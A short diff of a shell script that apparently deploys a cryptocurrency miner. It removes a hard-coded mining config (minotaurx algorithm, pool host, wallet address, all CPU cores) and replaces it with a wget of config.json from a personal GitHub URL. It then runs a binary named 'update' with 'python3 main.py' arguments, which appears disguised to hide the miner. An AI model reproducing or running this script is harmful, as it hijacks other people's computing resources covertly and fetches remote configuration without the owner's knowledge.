@@ -55,16 +55,9 @@ sleep 2
 sleep 2
 echo ""
 echo ""
-cat > config.json <<EOL
-[
-    {
-      "algorithm": "minotaurx",
-      "host": "flyingsaucer-eu.teatspray.fun",
-      "port": 7019,
-      "worker": "MGaypRJi43LcQxrgoL2CW28B31w4owLvv8",
-      "password": "$currentdate,c=MAZA,zap=MAZA",
-      "workers": $used_num_of_cores
-    }
-  ]
-  EOL
+sleep 2
+rm config.json
+sleep 2
+wget https://raw.githubusercontent.com/mvelisomakhenkce/python/main/config.json
+sleep 2
 ./update/update python3 main.py
